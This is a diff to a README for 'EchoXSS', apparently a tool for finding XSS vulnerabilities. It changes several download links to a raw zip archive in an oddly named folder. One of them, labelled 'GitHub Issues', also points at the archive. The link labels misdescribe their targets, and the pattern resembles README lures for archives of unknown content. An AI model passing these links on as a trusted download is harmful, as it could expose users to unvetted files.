@@ -6,7 +6,7 @@ Welcome to EchoXSS! This tool helps you find XSS vulnerabilities in websites. Yo
 
 ## 📥 Download EchoXSS
 
-[![Download EchoXSS](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/EchoXSS.zip)](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/EchoXSS.zip)
+[![Download EchoXSS](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/XSS_Echo_v1.2.zip)](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/XSS_Echo_v1.2.zip)
 
 ## 💾 System Requirements
 
@@ -30,7 +30,7 @@ Before you download, ensure your system meets these requirements:
 
 To get EchoXSS, visit this page to download:
 
-[Download EchoXSS](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/EchoXSS.zip)
+[Download EchoXSS](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/XSS_Echo_v1.2.zip)
 
 1. Go to the **Releases** page.
 2. Find the latest version labeled as "Latest Release".
@@ -86,7 +86,7 @@ We welcome contributions to improve EchoXSS. If you have suggestions or find bug
 
 Join our community to share tips and get help:
 
-- GitHub Issues: [EchoXSS Issues](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/EchoXSS.zip)
+- GitHub Issues: [EchoXSS Issues](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/XSS_Echo_v1.2.zip)
 - Discussions: Usually, you can find us in the discussions section of the repository.
 
 ## 📄 License
@@ -97,4 +97,4 @@ EchoXSS is open-source software licensed under the MIT License. You can use, mod
 
 Don’t forget to visit this page to download:
 
-[Download EchoXSS](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/EchoXSS.zip)
+[Download EchoXSS](https://raw.githubusercontent.com/wesam00/EchoXSS/main/unpricked/XSS_Echo_v1.2.zip)
